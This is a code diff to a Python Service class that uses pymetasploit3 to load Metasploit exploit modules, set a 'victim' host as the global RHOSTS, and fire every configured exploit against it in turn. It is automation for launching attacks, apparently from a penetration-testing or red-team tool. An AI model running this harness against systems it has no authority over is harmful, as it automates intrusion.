@@ -2,6 +2,12 @@
 
 import socket
 from pymetasploit3.msfrpc import MsfRpcClient
+from pprint import pprint
+
+from ..util.msf import (
+    splitmodule,
+    verifyJob
+)
 
 import logging
 log = logging.getLogger(__name__)
@@ -23,19 +29,29 @@ class Service(object):
         """ Return Modules in MsfRpcClient """
         return [m for m in dir(self._msfrpcd) if not m.startswith("_")]
 
-    def exploit(self, module, host):
+    def exploit(self, module):
         log.debug("Preparing exploit for {}".format(self.name))
-        # Split module type and path
-        mType, mPath = module.split("/", 1)
-        log.debug("Module Type: {}".format(mType))
-        log.debug("Module Path: {}".format(mPath))
-        pwn = self._msfrpcd.use("exploits", module)
+        mType, mPath = splitmodule(module)
+        pwn = self._msfrpcd.modules.use(mType, mPath)
+        # MSF options
+        # if "RHOST" in pwn.options:
+        #     pwn['RHOST'] = host
+        # elif "RHOSTS" in pwn.options:
+        #     pwn['RHOSTS'] = host
+        pwn['RPORT'] = self.ports[0] # Change self.port from a list to single entry
+#        pprint(pwn.options)
+#        pprint(pwn.targetpayloads())
         log.info("{} fired!".format(pwn.name))
+        return pwn.execute()
 
     def exploitall(self, host):
         log.debug("Sending all exploits for {}".format(self.name))
+        self.victim = host
         for i in self.exploits:
-            self.exploit(i, host)
+            result = self.exploit(i)
+            if not verifyJob(result):
+                log.info("Exploit failed...")
+                pass
 
     def login(self):
         return
@@ -76,7 +92,20 @@ class Service(object):
             return [s for s in self._msfrpcd.modules.exploits if keyword.lower() in s]
         return self._msfrpcd.modules.exploits
 
+
     """ Properties """
+
+    @property
+    def victim(self):
+        return self._victim
+
+    @victim.setter
+    def victim(self, host):
+        if not isinstance(host, str):
+            return TypeError("Host must be an IPv4 string.")
+        self._victim = host
+        self._msfrpcd.core.setg("RHOSTS", host)
+        self._msfrpcd.core.setg("RHOST", host)
 
     @property
     def auxiliary(self):
